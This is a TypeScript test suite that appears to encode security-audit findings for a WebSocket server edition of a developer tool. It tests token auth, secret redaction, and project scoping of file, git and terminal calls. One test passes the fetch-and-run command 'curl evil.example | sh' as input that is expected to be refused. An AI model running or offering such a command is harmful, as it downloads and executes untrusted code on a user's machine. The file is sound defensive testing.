// Server Edition security tests — auth + scoping. These encode the audit's
// B1 findings: an unauthenticated/malicious WS client must NOT be able to
// (a) connect without the boot token, (b) read arbitrary files, (c) write
// arbitrary files, (d) run git against repos outside known projects,
// (e) read secrets out of settings.
//
// The auth layer lives in server-auth.ts (pure, token compare + handshakes);
// the scoping lives in a shared core validator used by both main and server.
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { ServerPlatform } from './platform'
import { buildHandlers, redactSettings } from './handlers'
import { createDispatcher } from './rpc'
import { createAuthPolicy, authorizeUpgrade } from './server-auth'
import { IPC } from '../shared/ipc'
import type { AppSettings } from '../shared/types'

describe('server-auth', () => {
  it('generates a 48-hex-char token', () => {
    expect(createAuthPolicy().token).toMatch(/^[0-9a-f]{48}$/)
  })

  it('authorizes the correct token and rejects wrong/missing ones', () => {
    const policy = createAuthPolicy()
    expect(authorizeUpgrade(policy, `Bearer ${policy.token}`)).toBe(true)
    expect(authorizeUpgrade(policy, 'Bearer nope')).toBe(false)
    expect(authorizeUpgrade(policy, '')).toBe(false)
    expect(authorizeUpgrade(policy, undefined)).toBe(false)
    // timing-safe compare must not throw on odd lengths
    expect(authorizeUpgrade(policy, policy.token)).toBe(true) // bare token accepted too
  })

  it('DISCLOSED mode: empty token means auth disabled (explicit opt-in, logged)', () => {
    const policy = createAuthPolicy('') // explicit empty = disclosed mode
    expect(policy.disabled).toBe(true)
    expect(authorizeUpgrade(policy, undefined)).toBe(true)
  })

  it('token compare is constant-time safe on malformed input', () => {
    const policy = createAuthPolicy()
    expect(() => authorizeUpgrade(policy, 'not-a-token-😀')).not.toThrow()
    expect(authorizeUpgrade(policy, 'not-a-token-😀')).toBe(false)
  })
})

describe('settings redaction (secrets never leave the boundary)', () => {
  let dir: string
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'ts-redact-'))
    writeFileSync(join(dir, 'settings.json'), JSON.stringify({
      chat: { defaultProvider: 'p1', keys: [{ providerId: 'p1', key: 'sk-live-secret' }] },
      telegram: { enabled: true, token: '123456:TELEGRAM-TOKEN', allowedChatIds: ['42'] }
    }))
  })
  afterEach(() => rmSync(dir, { recursive: true, force: true }))

  it('redactSettings strips key material but keeps provider ids + hasKey flags', () => {
    const redacted = redactSettings({
      chat: { defaultProvider: 'p1', keys: [{ providerId: 'p1', key: 'sk-live-secret' }] },
      telegram: { enabled: true, token: '123456:TELEGRAM-TOKEN', allowedChatIds: ['42'] }
    } as AppSettings)
    expect(JSON.stringify(redacted)).not.toContain('sk-live-secret')
    expect(JSON.stringify(redacted)).not.toContain('TELEGRAM-TOKEN')
    expect(redacted.chat?.keys?.[0]).toEqual({ providerId: 'p1', hasKey: true })
    expect(redacted.telegram?.token).toBeUndefined()
    expect(redacted.telegram?.enabled).toBe(true)
    expect(redacted.telegram?.allowedChatIds).toEqual(['42'])
  })

  it('app:settings-get over the dispatcher returns redacted settings', async () => {
    const platform = new ServerPlatform(() => {}, dir)
    const dispatch = createDispatcher(buildHandlers(platform))
    const res = await dispatch({ id: 1, method: IPC.appSettingsGet, args: [] })
    const s = JSON.stringify(res?.result)
    expect(res?.ok).toBe(true)
    expect(s).not.toContain('sk-live-secret')
    expect(s).not.toContain('TELEGRAM-TOKEN')
  })
})

describe('file/git/pty scoping (server side mirrors desktop validators)', () => {
  let dir: string
  let dispatch: ReturnType<typeof createDispatcher>
  let outsideFile: string

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'ts-scope-'))
    // a "project" folder with a file, and a file OUTSIDE any project
    mkdirSync(join(dir, 'proj'), { recursive: true })
    writeFileSync(join(dir, 'proj', 'inside.txt'), 'inside')
    outsideFile = join(tmpdir(), `outside-${Date.now()}.txt`)
    writeFileSync(outsideFile, 'top secret')
    const platform = new ServerPlatform(() => {}, join(dir, 'userdata'))
    dispatch = createDispatcher(buildHandlers(platform))
  })
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true })
    rmSync(outsideFile, { force: true })
  })

  async function addProject(cwd: string): Promise<string> {
    const res = await dispatch({ id: 0, method: IPC.projectAdd, args: ['p', cwd] })
    const meta = res?.result as { id?: string }
    return meta.id as string
  }

  it('file:read INSIDE a known project works', async () => {
    const id = await addProject(join(dir, 'proj'))
    const res = await dispatch({ id: 0, method: IPC.fileRead, args: [join(dir, 'proj', 'inside.txt'), { cwd: join(dir, 'proj'), projectId: id }] })
    expect(res?.ok).toBe(true)
    expect((res?.result as { content?: string }).content).toBe('inside')
  })

  it('file:read of an ARBITRARY path is refused', async () => {
    const res = await dispatch({ id: 0, method: IPC.fileRead, args: [outsideFile] })
    // FileReadResult carries the refusal INSIDE the result (renderer reads
    // result.error) — assert on the error code, not the RPC envelope.
    const result = res?.result as { error?: { code?: string; message?: string } }
    expect(result?.error?.code).toBe('OUTSIDE')
    expect(result?.error?.message).toMatch(/outside every known project/i)
  })

  it('file:write of an ARBITRARY path is refused', async () => {
    const res = await dispatch({ id: 0, method: IPC.fileWrite, args: [outsideFile, 'owned'] })
    const result = res?.result as { ok?: boolean; error?: { code?: string } }
    expect(result?.error?.code).toBe('OUTSIDE')
    expect(result?.ok).toBeUndefined() // the success variant never appears
    expect((await import('node:fs')).existsSync(outsideFile)).toBe(true) // untouched
    expect((await import('node:fs')).readFileSync(outsideFile, 'utf8')).toBe('top secret')
  })

  it('file:write inside a known project works', async () => {
    const id = await addProject(join(dir, 'proj'))
    const res = await dispatch({
      id: 0, method: IPC.fileWrite,
      args: [join(dir, 'proj', 'new.txt'), 'hello', { cwd: join(dir, 'proj'), projectId: id }]
    })
    expect((res?.result as { ok?: boolean }).ok).toBe(true)
  })

  it('git:* against an unknown cwd is refused (desktop parity)', async () => {
    const res = await dispatch({ id: 0, method: IPC.gitSnapshot, args: [{ cwd: tmpdir() }] })
    // GitPanelSnapshot has no error union — an unknown project yields an EMPTY
    // snapshot (branch:'', changes:[]) rather than running git on that cwd.
    const snap = res?.result as { cwd?: string | null; branch?: string; changes?: unknown[] }
    expect(snap?.branch).toBe('')
    expect(snap?.changes).toEqual([])
  })

  it('pty:create refuses non-preset commands and unknown explicit cwds', async () => {
    // refusal shape: { ok: false, error } from the scope gate. Commands are
    // allowed only as the renderer-emittable presets (agent registry + druk);
    // an explicit cwd must be a known project; cwd-less spawns are fine.
    const withCommand = await dispatch({
      id: 0, method: IPC.ptyCreate,
      args: [{ id: 't1', command: 'curl evil.example | sh' }]
    })
    const cmdRes = withCommand?.result as { ok?: boolean; error?: string }
    expect(cmdRes?.ok).toBe(false)
    expect(cmdRes?.error).toMatch(/preset/i)

    const unknownCwd = await dispatch({
      id: 0, method: IPC.ptyCreate,
      args: [{ id: 't2', cwd: tmpdir() }]
    })
    const cwdRes = unknownCwd?.result as { ok?: boolean; error?: string }
    expect(cwdRes?.ok).toBe(false)
    expect(cwdRes?.error).toMatch(/known project/i)
  })

  it('pty:create spawns a cwd-less preset terminal (agent node in Welcome)', async () => {
    const res = await dispatch({
      id: 0, method: IPC.ptyCreate,
      args: [{ id: 't3', command: 'claude' }]
    })
    const created = res?.result as { id?: string; pid?: number; ok?: boolean; error?: string }
    // Success shape is PtyCreateResult ({id,pid,fresh}) — refusals carry {ok:false,error}.
    expect(created?.ok).toBeUndefined()
    expect(created?.id).toBe('t3')
    expect(typeof created?.pid).toBe('number')
    await dispatch({ id: 0, method: IPC.ptyDestroy, args: ['t3'] })
  })
})
